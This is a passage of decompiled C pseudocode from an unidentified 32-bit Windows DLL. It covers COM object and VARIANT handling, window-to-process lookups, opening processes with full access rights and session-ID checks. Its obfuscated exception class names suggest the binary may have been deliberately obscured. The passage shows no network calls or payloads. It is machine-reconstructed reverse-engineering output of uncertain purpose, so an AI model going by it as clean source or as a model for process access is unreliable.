      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10044D2C) --------------------------------------------------------
void __usercall sub_10044D2C(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10044D97) --------------------------------------------------------
BSTR **__userpurge sub_10044D97@<eax>(BSTR **a1@<edi>, const CHAR *a2)
{
  BSTR *v2; // esi
  BSTR *v3; // eax

  v2 = (BSTR *)operator new(0xCu);
  if ( v2 )
    v3 = sub_10044DE9(v2, a2);
  else
    v3 = 0;
  *a1 = v3;
  if ( !v3 )
    sub_1004AEC0(-2147024882);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10044DE9) --------------------------------------------------------
BSTR *__userpurge sub_10044DE9@<eax>(BSTR *a1@<esi>, const CHAR *a2)
{
  a1[1] = 0;
  a1[2] = (BSTR)1;
  *a1 = sub_1004B040(a2);
  return a1;
}

//----- (10044E7A) --------------------------------------------------------
int __usercall sub_10044E7A@<eax>(OLECHAR ***a1@<eax>, int a2@<esi>)
{
  OLECHAR **v2; // eax
  OLECHAR *v3; // edi
  UINT v4; // eax
  BSTR v5; // eax

  *(_WORD *)a2 = 8;
  v2 = *a1;
  if ( v2 )
    v3 = *v2;
  else
    v3 = 0;
  if ( v3 )
  {
    v4 = SysStringByteLen(v3);
    v5 = SysAllocStringByteLen((LPCSTR)v3, v4);
    *(_DWORD *)(a2 + 8) = v5;
    if ( !v5 )
      sub_1004AEC0(-2147024882);
  }
  else
  {
    *(_DWORD *)(a2 + 8) = 0;
  }
  return a2;
}

//----- (10044EB9) --------------------------------------------------------
VARIANTARG *__usercall sub_10044EB9@<eax>(LONG a1@<eax>, VARIANTARG *a2@<esi>)
{
  VARTYPE vt; // ax

  vt = a2->vt;
  if ( a2->vt == 3 || vt == 10 )
    goto LABEL_6;
  if ( vt != 11 )
  {
    sub_10044EED(a2);
    a2->vt = 3;
LABEL_6:
    a2->lVal = a1;
    return a2;
  }
  a2->iVal = -(a1 != 0);
  return a2;
}

//----- (10044EED) --------------------------------------------------------
int __stdcall sub_10044EED(VARIANTARG *pvarg)
{
  int result; // eax

  result = VariantClear(pvarg);
  if ( result < 0 )
    sub_1004AEC0(result);
  return result;
}

//----- (10044F0C) --------------------------------------------------------
int __usercall sub_10044F0C@<eax>(int *a1@<esi>)
{
  int v1; // eax
  int v2; // eax
  int v4; // [esp+0h] [ebp-4h] BYREF

  v1 = *a1;
  v4 = 0;
  v2 = (*(int (__stdcall **)(int *, int *))(v1 + 28))(a1, &v4);
  if ( v2 < 0 )
    sub_1004AED0(v2, (int)a1, (int)&unk_10095874);
  return v4;
}

//----- (10044F33) --------------------------------------------------------
_DWORD *__userpurge sub_10044F33@<eax>(_DWORD *a1@<edx>, int *a2@<ebx>, _DWORD *a3)
{
  int v3; // eax
  int v4; // eax
  _DWORD *result; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF

  v3 = *a2;
  v6 = 0;
  v4 = (*(int (__stdcall **)(int *, _DWORD, _DWORD, _DWORD, _DWORD, int *))(v3 + 32))(a2, *a1, a1[1], a1[2], a1[3], &v6);
  if ( v4 < 0 )
    sub_1004AED0(v4, (int)a2, (int)&unk_10095874);
  result = a3;
  *a3 = v6;
  return result;
}

//----- (10045021) --------------------------------------------------------
int __thiscall sub_10045021(_DWORD *this)
{
  return this[1];
}

//----- (10045025) --------------------------------------------------------
_DWORD *__thiscall sub_10045025(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  int v6[5]; // [esp-4h] [ebp-24h] BYREF
  void *Block; // [esp+10h] [ebp-10h]
  int v8; // [esp+1Ch] [ebp-4h]

  v6[4] = 0;
  Block = operator new(8u);
  v8 = 1;
  if ( Block )
  {
    v3 = this[3];
    v6[3] = (int)v6;
    v6[0] = v3;
    if ( v3 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
    LOBYTE(v8) = 1;
    v4 = sub_10045282(Block, v6[0]);
  }
  else
  {
    v4 = 0;
  }
  LOBYTE(v8) = 0;
  sub_1003F06B(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004509D) --------------------------------------------------------
int __thiscall sub_1004509D(_DWORD *this)
{
  return this[1];
}

//----- (100450A1) --------------------------------------------------------
int __thiscall sub_100450A1(_DWORD *this)
{
  return this[2];
}

//----- (100450A5) --------------------------------------------------------
_DWORD *__stdcall sub_100450A5(_DWORD *a1, int a2)
{
  *a1 = &off_10095B48;
  *a1 = &off_10095BE0;
  a1[1] = a2;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 4))(a2);
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return a1;
}
// 10095B48: using guessed type int (__thiscall *off_10095B48)(void *Block, char);
// 10095BE0: using guessed type int (__thiscall *off_10095BE0)(void *Block, char);

//----- (100450F8) --------------------------------------------------------
_DWORD *__thiscall sub_100450F8(_DWORD *Block, char a2)
{
  sub_1004511B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004511B) --------------------------------------------------------
int __thiscall sub_1004511B(_DWORD *this)
{
  int result; // eax

  *this = &off_10095BE0;
  result = this[1];
  if ( result )
    result = (*(int (__stdcall **)(int))(*(_DWORD *)result + 8))(result);
  *this = &off_10095B48;
  return result;
}
// 10095B48: using guessed type int (__thiscall *off_10095B48)(void *Block, char);
// 10095BE0: using guessed type int (__thiscall *off_10095BE0)(void *Block, char);

//----- (1004515A) --------------------------------------------------------
_DWORD *__thiscall sub_1004515A(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // eax
  int v6; // [esp-8h] [ebp-24h]
  void *Block; // [esp+Ch] [ebp-10h]

  Block = operator new(0x28u);
  if ( Block )
  {
    v6 = this[1];
    if ( v6 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v6 + 4))(v6);
    v4 = sub_10047F88((int)Block, v6, a3);
  }
  else
  {
    v4 = 0;
  }
  sub_1000AAD3(a2, v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100451D4) --------------------------------------------------------
int __thiscall sub_100451D4(_DWORD *this, int a2)
{
  int v3; // edi
  int v4; // esi
  _DWORD *v5; // eax
  int v6; // eax
  VARIANTARG pvarg; // [esp+8h] [ebp-1Ch] BYREF
  int v9; // [esp+20h] [ebp-4h]

  VariantInit(&pvarg);
  v3 = 0;
  v9 = 0;
  if ( !this[1] )
    sub_1004AEC0(-2147467261);
  if ( (*(int (__stdcall **)(_DWORD, VARIANTARG *))(*(_DWORD *)this[1] + 84))(this[1], &pvarg) < 0 || pvarg.vt != 9 )
    goto LABEL_9;
  v4 = a2;
  if ( !(*(int (__thiscall **)(int))(*(_DWORD *)a2 + 4))(a2) )
  {
LABEL_8:
    a2 = 3656208;
    (*(void (__stdcall **)(LONG, int *))(*pvarg.plVal + 12))(pvarg.lVal, &a2);
LABEL_9:
    v3 = 0xFFFFFF;
    goto LABEL_10;
  }
  while ( 1 )
  {
    v5 = (_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)v4 + 48))(v4, v3);
    v6 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v5 + 4))(*v5);
    if ( v6 == pvarg.lVal )
      break;
    if ( ++v3 >= (unsigned int)(*(int (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4) )
      goto LABEL_8;
  }
LABEL_10:
  v9 = -1;
  VariantClear(&pvarg);
  return v3;
}

//----- (10045282) --------------------------------------------------------
_DWORD *__stdcall sub_10045282(_DWORD *a1, int a2)
{
  *a1 = &off_10095BB4;
  *a1 = &off_10095BEC;
  a1[1] = a2;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 4))(a2);
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return a1;
}
// 10095BB4: using guessed type int (__thiscall *off_10095BB4)(void *Block, char);
// 10095BEC: using guessed type int (__thiscall *off_10095BEC)(void *Block, char);

//----- (100452D5) --------------------------------------------------------
_DWORD *__thiscall sub_100452D5(_DWORD *Block, char a2)
{
  sub_100452F8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100452F8) --------------------------------------------------------
int __thiscall sub_100452F8(_DWORD *this)
{
  int result; // eax

  *this = &off_10095BEC;
  result = this[1];
  if ( result )
    result = (*(int (__stdcall **)(int))(*(_DWORD *)result + 8))(result);
  *this = &off_10095BB4;
  return result;
}
// 10095BB4: using guessed type int (__thiscall *off_10095BB4)(void *Block, char);
// 10095BEC: using guessed type int (__thiscall *off_10095BEC)(void *Block, char);

//----- (10045337) --------------------------------------------------------
_DWORD *__thiscall sub_10045337(_DWORD *this, _DWORD *a2)
{
  void *v3; // eax
  int v4; // eax
  void *v6[5]; // [esp-4h] [ebp-24h] BYREF
  void *Block; // [esp+10h] [ebp-10h]
  int v8; // [esp+1Ch] [ebp-4h]

  v6[4] = 0;
  Block = operator new(0x14u);
  v8 = 1;
  if ( Block )
  {
    v3 = (void *)this[1];
    v6[3] = v6;
    v6[0] = v3;
    if ( v3 )
      (*(void (__stdcall **)(void *))(*(_DWORD *)v3 + 4))(v3);
    LOBYTE(v8) = 1;
    v4 = sub_10048A00((int)Block, v6[0]);
  }
  else
  {
    v4 = 0;
  }
  LOBYTE(v8) = 0;
  sub_1000AB64(a2, v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100453AF) --------------------------------------------------------
int *__thiscall sub_100453AF(_DWORD *this, int *a2, int a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int *v6; // eax
  volatile LONG *v7; // ecx
  int v8; // ecx
  volatile LONG *v10; // [esp-10h] [ebp-30h] BYREF
  volatile LONG *v11; // [esp-Ch] [ebp-2Ch]
  int *v12; // [esp-8h] [ebp-28h] BYREF
  int v13; // [esp-4h] [ebp-24h]
  void *Block; // [esp+Ch] [ebp-14h]
  int v15; // [esp+10h] [ebp-10h]
  int v16; // [esp+1Ch] [ebp-4h]

  v15 = 0;
  v4 = operator new(0x10u);
  Block = v4;
  v16 = 1;
  if ( v4 )
    v5 = sub_10046C1F(v4);
  else
    v5 = 0;
  sub_10046BD8(a2, (int)v5);
  v16 = 0;
  v13 = a3;
  v6 = (int *)this[1];
  v7 = (volatile LONG *)&v12;
  v15 = 1;
  v12 = v6;
  if ( v6 )
    (*(void (__stdcall **)(int *))(*v6 + 4))(v6);
  v16 = 2;
  v11 = v7;
  v10 = v7;
  v11 = (volatile LONG *)a2[1];
  v8 = *a2;
  Block = &v10;
  v10 = (volatile LONG *)v8;
  InterlockedIncrement(v11);
  LOBYTE(v16) = 0;
  sub_10045456(this, (int)v10, v11, v12, v13);
  return a2;
}
// 1004541A: variable 'v7' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10045456) --------------------------------------------------------
int __thiscall sub_10045456(void *this, int a2, volatile LONG *lpAddend, int *a4, unsigned __int16 pExceptionObject)
{
  const CHAR *v5; // eax
  OLECHAR ***v6; // eax
  _DWORD *v7; // esi
  int *v8; // eax
  int v9; // ecx
  int v10; // ecx
  LONG i; // edi
  int *v12; // eax
  int v13; // ecx
  BSTR *v14; // ebx
  _DWORD *v15; // eax
  _DWORD *v16; // eax
  int v17; // esi
  int v18; // ecx
  int v19; // edi
  int *v20; // ecx
  int v21; // ecx
  int result; // eax
  int v23; // [esp-10h] [ebp-74h] BYREF
  volatile LONG *v24; // [esp-Ch] [ebp-70h]
  int v25; // [esp-8h] [ebp-6Ch] BYREF
  BSTR *v26; // [esp-4h] [ebp-68h] BYREF
  VARIANTARG v27; // [esp+Ch] [ebp-58h] BYREF
  VARIANTARG pvarg; // [esp+1Ch] [ebp-48h] BYREF
  int *v29; // [esp+2Ch] [ebp-38h]
  void *v30; // [esp+30h] [ebp-34h]
  int v31; // [esp+34h] [ebp-30h] BYREF
  LONG v32; // [esp+38h] [ebp-2Ch] BYREF
  int v33; // [esp+3Ch] [ebp-28h] BYREF
  BSTR *v34; // [esp+40h] [ebp-24h] BYREF
  int *v35; // [esp+44h] [ebp-20h] BYREF
  int *v36; // [esp+48h] [ebp-1Ch] BYREF
  int v37; // [esp+4Ch] [ebp-18h] BYREF
  void *Block; // [esp+50h] [ebp-14h] BYREF
  int v39; // [esp+54h] [ebp-10h] BYREF
  int v40; // [esp+60h] [ebp-4h]

  v30 = this;
  v40 = 1;
  if ( pExceptionObject )
  {
    if ( !a4 )
      sub_1004AEC0(-2147467261);
    sub_10045FC1(a4, &v35);
    LOBYTE(v40) = 2;
    if ( !v35 )
      goto LABEL_5;
    v5 = (const CHAR *)sub_1000E8F9((int)&unk_100B6424);
    v6 = sub_10044D97(&v34, v5);
    LOBYTE(v40) = 3;
    v7 = (_DWORD *)sub_10044E7A(v6, (int)&pvarg);
    LOBYTE(v40) = 4;
    if ( !v35 )
      sub_1004AEC0(-2147467261);
    v8 = sub_10045F63(v7, v35, &v33);
    LOBYTE(v40) = 5;
    sub_10047132(v9, (int *)&v36, v8);
    LOBYTE(v40) = 7;
    if ( v33 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v33 + 8))(v33);
    LOBYTE(v40) = 8;
    VariantClear(&pvarg);
    LOBYTE(v40) = 9;
    if ( v34 )
    {
      sub_10008E98((volatile LONG *)v34);
      v34 = 0;
    }
    if ( !v36 )
      goto LABEL_5;
    v32 = sub_10045ED2(v36);
    v27.vt = 3;
    v27.lVal = 0;
    LOBYTE(v40) = 10;
    for ( i = 0; i < v32; ++i )
    {
      sub_10044EB9(i, &v27);
      if ( !v36 )
        sub_1004AEC0(-2147467261);
      v12 = sub_10045EF9((int *)&v27, v36, &v33, &v27);
      LOBYTE(v40) = 11;
      sub_10047187(v13, (int *)&v34, v12);
      LOBYTE(v40) = 13;
      if ( v33 )
        (*(void (__stdcall **)(int))(*(_DWORD *)v33 + 8))(v33);
      v14 = v34;
      if ( v34 )
      {
        Block = operator new(8u);
        LOBYTE(v40) = 14;
        if ( Block )
        {
          v29 = (int *)&v26;
          v26 = v14;
          if ( v14 )
            (*((void (__stdcall **)(BSTR *))*v14 + 1))(v14);
          LOBYTE(v40) = 14;
          v15 = sub_100450A5(Block, (int)v26);
        }
        else
        {
          v15 = 0;
        }
        LOBYTE(v40) = 13;
        v16 = sub_10044C62(&pvarg.lVal, (int)v15);
        LOBYTE(v40) = 16;
        (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)a2 + 36))(a2, v16);
        LOBYTE(v40) = 13;
        sub_100448D2(&pvarg.decVal.Lo32);
      }
      LOBYTE(v40) = 10;
      if ( v14 )
        (*((void (__stdcall **)(BSTR *))*v14 + 2))(v14);
    }
    sub_100471EC(v10, &v33, (int *)&a4);
    v39 = 0;
    v37 = 0;
    LOBYTE(v40) = 19;
    v31 = 0;
    if ( !v33 )
      sub_1004AEC0(-2147467261);
    v39 = 0;
    if ( (*(int (__stdcall **)(int, int, int *))(*(_DWORD *)v33 + 16))(v33, 1, &v39) < 0 )
    {
LABEL_5:
      sub_10016441(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    while ( 1 )
    {
      if ( !v39 )
        sub_1004AEC0(-2147467261);
      v17 = v39;
      if ( v37 )
        (*(void (__stdcall **)(int))(*(_DWORD *)v37 + 8))(v37);
      v37 = 0;
      if ( (*(int (__stdcall **)(int, int, int *, int *))(*(_DWORD *)v17 + 12))(v17, 1, &v37, &v31) )
        break;
      sub_10047241(v18, &v32, &v37);
      Block = 0;
      v34 = 0;
      LOBYTE(v40) = 22;
      v19 = v32;
      if ( v32 )
      {
        Block = 0;
        if ( (*(int (__stdcall **)(LONG, void **))(*(_DWORD *)v32 + 72))(v32, &Block) >= 0 )
        {
          if ( *sub_100472A6(v20, (int *)&v34, (int *)&Block) )
          {
            v26 = (BSTR *)(pExceptionObject - 1);
            v25 = v21;
            v29 = &v25;
            sub_1004730A(v21, &v25, (int *)&v34);
            LOBYTE(v40) = 23;
            pvarg.cyVal.Hi = (LONG)&v23;
            v24 = lpAddend;
            v23 = a2;
            InterlockedIncrement(lpAddend);
            LOBYTE(v40) = 22;
            sub_10045456(v23, v24, v25, (__int16)v26);
          }
        }
      }
      LOBYTE(v40) = 21;
      if ( v34 )
        (*((void (__stdcall **)(BSTR *))*v34 + 2))(v34);
      LOBYTE(v40) = 20;
      if ( Block )
        (*(void (__stdcall **)(void *))(*(_DWORD *)Block + 8))(Block);
      LOBYTE(v40) = 19;
      if ( v19 )
        (*(void (__stdcall **)(int))(*(_DWORD *)v19 + 8))(v19);
    }
    LOBYTE(v40) = 18;
    if ( v37 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v37 + 8))(v37);
    LOBYTE(v40) = 17;
    if ( v39 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v39 + 8))(v39);
    LOBYTE(v40) = 10;
    (*(void (__stdcall **)(int))(*(_DWORD *)v33 + 8))(v33);
    LOBYTE(v40) = 9;
    VariantClear(&v27);
    LOBYTE(v40) = 2;
    if ( v36 )
      (*(void (__stdcall **)(int *))(*v36 + 8))(v36);
    LOBYTE(v40) = 1;
    if ( v35 )
      (*(void (__stdcall **)(int *))(*v35 + 8))(v35);
  }
  LOBYTE(v40) = 0;
  sub_10044882(&a2);
  v40 = -1;
  result = (int)a4;
  if ( a4 )
    return (*(int (__stdcall **)(int *))(*a4 + 8))(a4);
  return result;
}
// 10045550: conditional instruction was optimized away because %var_1C.4!=0
// 10045680: conditional instruction was optimized away because %var_10.4==0
// 10045709: conditional instruction was optimized away because %var_2C.4!=0
// 1004571A: conditional instruction was optimized away because %Block.4==0
// 10045505: variable 'v9' is possibly undefined
// 100455AF: variable 'v13' is possibly undefined
// 10045650: variable 'v10' is possibly undefined
// 100456E0: variable 'v18' is possibly undefined
// 1004573B: variable 'v20' is possibly undefined
// 1004574F: variable 'v21' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10045850) --------------------------------------------------------
_DWORD *__stdcall sub_10045850(_DWORD *a1, int a2)
{
  int v3; // [esp-8h] [ebp-24h] BYREF
  int *v4; // [esp-4h] [ebp-20h]
  int *pExceptionObject; // [esp+Ch] [ebp-10h] BYREF
  int v6; // [esp+18h] [ebp-4h]

  v6 = 0;
  *a1 = &off_10095BC0;
  LOBYTE(v6) = 1;
  a1[1] = 0;
  *a1 = &off_10095BF8;
  a1[2] = a2;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 4))(a2);
  a1[3] = 0;
  LOBYTE(v6) = 3;
  v4 = a1 + 3;
  pExceptionObject = &v3;
  v3 = a2;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 4))(a2);
  LOBYTE(v6) = 3;
  if ( !sub_100459EE(v3, v4) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return a1;
}
// 10095BC0: using guessed type int (__thiscall *off_10095BC0)(void *Block, char);
// 10095BF8: using guessed type int (__thiscall *off_10095BF8)(void *Block, char);

//----- (100458F8) --------------------------------------------------------
_DWORD *__thiscall sub_100458F8(_DWORD *Block, char a2)
{
  sub_1004599B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004591B) --------------------------------------------------------
_DWORD *__stdcall sub_1004591B(_DWORD *a1, int a2, int a3, int a4)
{
  *a1 = &off_10095BC0;
  *a1 = &off_10095BF8;
  a1[1] = a3;
  a1[2] = a2;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 4))(a2);
  a1[3] = a4;
  if ( a4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a4 + 4))(a4);
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  if ( a4 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a4 + 8))(a4);
  return a1;
}
// 10095BC0: using guessed type int (__thiscall *off_10095BC0)(void *Block, char);
// 10095BF8: using guessed type int (__thiscall *off_10095BF8)(void *Block, char);

//----- (1004599B) --------------------------------------------------------
int __thiscall sub_1004599B(_DWORD *this)
{
  int v2; // eax
  int result; // eax

  *this = &off_10095BF8;
  v2 = this[3];
  if ( v2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v2 + 8))(v2);
  result = this[2];
  if ( result )
    result = (*(int (__stdcall **)(_DWORD))(*(_DWORD *)result + 8))(this[2]);
  *this = &off_10095BC0;
  return result;
}
// 10095BC0: using guessed type int (__thiscall *off_10095BC0)(void *Block, char);
// 10095BF8: using guessed type int (__thiscall *off_10095BF8)(void *Block, char);

//----- (100459EE) --------------------------------------------------------
char __cdecl sub_100459EE(int a1, int *a2)
{
  HWND *v2; // ecx
  HWND *v3; // edi
  _DWORD *v4; // eax
  int v5; // eax
  int *v6; // eax
  wchar_t *v7; // eax
  _DWORD *v8; // eax
  bool v9; // bl
  int *v10; // ecx
  char v11; // bl
  HWND v13; // [esp-8h] [ebp-48h]
  int v14[3]; // [esp+Ch] [ebp-34h] BYREF
  int v15; // [esp+18h] [ebp-28h] BYREF
  int v16; // [esp+1Ch] [ebp-24h] BYREF
  int v17; // [esp+20h] [ebp-20h] BYREF
  int v18; // [esp+24h] [ebp-1Ch] BYREF
  int v19; // [esp+28h] [ebp-18h] BYREF
  DWORD dwProcessId; // [esp+2Ch] [ebp-14h] BYREF
  int v21; // [esp+30h] [ebp-10h] BYREF
  int v22; // [esp+3Ch] [ebp-4h]

  v3 = v2;
  v22 = 1;
  v19 = 0;
  v21 = 0;
  if ( !a1 )
    sub_1004AEC0(-2147467261);
  if ( (*(int (__stdcall **)(int, HWND *))(*(_DWORD *)a1 + 148))(a1, v2) < 0
    || (v13 = *v3, dwProcessId = 0, !GetWindowThreadProcessId(v13, &dwProcessId)) )
  {
    LOBYTE(v22) = 0;
    if ( v21 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v21 + 8))(v21);
    v22 = -1;
    (*(void (__stdcall **)(int))(*(_DWORD *)a1 + 8))(a1);
    return 0;
  }
  v4 = sub_10022A56(dwProcessId, v14, 0x1F0FFFu);
  LOBYTE(v22) = 2;
  v5 = (*(int (__thiscall **)(_DWORD *, int *))(*v4 + 72))(v4, &v15);
  LOBYTE(v22) = 3;
  sub_10012A7C(&v17, v5);
  LOBYTE(v22) = 5;
  sub_1000CE59(&v15);
  LOBYTE(v22) = 6;
  sub_10001FCC(v14);
  v6 = sub_1000D426(&v17);
  sub_10012A7C(&v15, (int)v6);
  LOBYTE(v22) = 7;
  sub_10002C25(&v16, &v18);
  LOBYTE(v22) = 6;
  sub_10012AAC(&v15);
  v7 = (wchar_t *)sub_1000E943((int)&unk_100B6440);
  v8 = sub_1000CC20(&v15, v7);
  LOBYTE(v22) = 8;
  v9 = sub_1000D8AA((int)v8, (int)&v17, 0) == -1;
  LOBYTE(v22) = 6;
  sub_1000CE59(&v15);
  if ( v9 )
  {
    LOBYTE(v22) = 1;
    sub_10012AAC(&v17);
    LOBYTE(v22) = 0;
    if ( v21 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v21 + 8))(v21);
    v22 = -1;
    (*(void (__stdcall **)(int))(*(_DWORD *)a1 + 8))(a1);
    return 0;
  }
  LOBYTE(v22) = 1;
  sub_10012AAC(&v17);
  if ( (*(int (__stdcall **)(int, int *))(*(_DWORD *)a1 + 160))(a1, &v19) < 0 || !(_WORD)v19 )
    goto LABEL_16;
  if ( v21 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v21 + 8))(v21);
  v21 = 0;
  if ( (*(int (__stdcall **)(int, int *))(*(_DWORD *)a1 + 72))(a1, &v21) >= 0 && *sub_1004735F(v10, a2, &v21) )
    v11 = 1;
  else
LABEL_16:
    v11 = 0;
  LOBYTE(v22) = 0;
  if ( v21 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v21 + 8))(v21);
  v22 = -1;
  (*(void (__stdcall **)(int))(*(_DWORD *)a1 + 8))(a1);
  return v11;
}
// 100459FE: variable 'v2' is possibly undefined
// 10045B72: variable 'v10' is possibly undefined
// 100459EE: using guessed type int var_34[3];

//----- (10045BD0) --------------------------------------------------------
_DWORD *__stdcall sub_10045BD0(_DWORD *a1, int a2, int a3)
{
  _DWORD pExceptionObject[3]; // [esp+Ch] [ebp-18h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v5 = 0;
  *a1 = &off_10095BCC;
  LOBYTE(v5) = 1;
  a1[1] = 0;
  *a1 = &off_10095C04;
  a1[2] = a2;
  a1[3] = a3;
  if ( a3 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a3 + 4))(a3);
  LOBYTE(v5) = 2;
  if ( !ProcessIdToSessionId(a1[2], a1 + 1) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v5 = -1;
  if ( a3 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a3 + 8))(a3);
  return a1;
}
// 10095BCC: using guessed type int (__thiscall *off_10095BCC)(void *Block, char);
// 10095C04: using guessed type int (__thiscall *off_10095C04)(void *Block, char);
// 10045BD0: using guessed type _DWORD pExceptionObject[3];

//----- (10045C5E) --------------------------------------------------------
_DWORD *__thiscall sub_10045C5E(_DWORD *Block, char a2)
{
  sub_10045C81(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10045C81) --------------------------------------------------------
int __thiscall sub_10045C81(_DWORD *this)
{
  int result; // eax

  *this = &off_10095C04;
  result = this[3];
  if ( result )
    result = (*(int (__stdcall **)(int))(*(_DWORD *)result + 8))(result);
  *this = &off_10095BCC;
  return result;
}
// 10095BCC: using guessed type int (__thiscall *off_10095BCC)(void *Block, char);
// 10095C04: using guessed type int (__thiscall *off_10095C04)(void *Block, char);

//----- (10045CC0) --------------------------------------------------------
bool __thiscall sub_10045CC0(DWORD *this)
{
  HANDLE v1; // esi
  bool v2; // bl
  DWORD ExitCode; // [esp+8h] [ebp-4h] BYREF

  ExitCode = 0;
  v1 = OpenProcess(0x400u, 0, this[2]);
  v2 = v1 && GetExitCodeProcess(v1, &ExitCode) && ExitCode == 259;
  if ( v1 )
    CloseHandle(v1);
  return v2;
}

//----- (10045D0F) --------------------------------------------------------
int *__thiscall sub_10045D0F(int **this, int *a2)
{
  int *v3; // eax
  int v4; // ecx
  int v5; // ebx
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int v9; // [esp-Ch] [ebp-64h] BYREF
  int v10; // [esp-8h] [ebp-60h] BYREF
  int *v11; // [esp-4h] [ebp-5Ch] BYREF
  VARIANTARG pvarg; // [esp+Ch] [ebp-4Ch] BYREF
  _DWORD v13[4]; // [esp+1Ch] [ebp-3Ch] BYREF
  int v14; // [esp+2Ch] [ebp-2Ch]
  void *Block; // [esp+30h] [ebp-28h]
  int v16; // [esp+34h] [ebp-24h] BYREF
  int v17[2]; // [esp+38h] [ebp-20h] BYREF
  int v18; // [esp+40h] [ebp-18h]
  int *v19; // [esp+44h] [ebp-14h] BYREF
  LONG i; // [esp+48h] [ebp-10h]
  int v21; // [esp+54h] [ebp-4h]

  sub_10047417(a2);
  v17[1] = 1;
  v19 = 0;
  v21 = 1;
  if ( !this[3] )
    sub_1004AEC0(-2147467261);
  v14 = sub_10044F0C(this[3]);
  pvarg.vt = 3;
  pvarg.lVal = 0;
  LOBYTE(v21) = 2;
  v18 = 0;
  for ( i = 0; i < v14; ++i )
  {
    sub_10044EB9(i, &pvarg);
    if ( !this[3] )
      sub_1004AEC0(-2147467261);
    v3 = sub_10044F33(&pvarg, this[3], v17);
    LOBYTE(v21) = 3;
    sub_1004745B(v4, &v16, v3);
    LOBYTE(v21) = 5;
    if ( v17[0] )
      (*(void (__stdcall **)(int))(*(_DWORD *)v17[0] + 8))(v17[0]);
    v5 = v16;
    if ( v16 )
    {
      v11 = (int *)&v19;
      Block = &v10;
      v10 = v16;
      (*(void (__stdcall **)(int))(*(_DWORD *)v16 + 4))(v16);
      LOBYTE(v21) = 5;
      if ( sub_100459EE(v10, v11) )
      {
        Block = operator new(0x10u);
        LOBYTE(v21) = 7;
        if ( Block )
        {
          v11 = v19;
          v13[3] = &v11;
          if ( v19 )
            (*(void (__stdcall **)(int *))(*v19 + 4))(v19);
          LOBYTE(v21) = 8;
          v10 = v18 + i;
          v13[2] = &v9;
          v9 = v5;
          if ( v5 )
            (*(void (__stdcall **)(int))(*(_DWORD *)v5 + 4))(v5);
          LOBYTE(v21) = 7;
          v6 = sub_1004591B(Block, v9, v10, (int)v11);
        }
        else
        {
          v6 = 0;
        }
        LOBYTE(v21) = 5;
        v7 = sub_10041905(v13, (int)v6);
        LOBYTE(v21) = 10;
        sub_100409A5(a2, (int)v7);
        LOBYTE(v21) = 5;
        sub_1004081F(v13);
      }
    }
    LOBYTE(v21) = 2;
    if ( v5 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v5 + 8))(v5);
  }
  LOBYTE(v21) = 1;
  VariantClear(&pvarg);
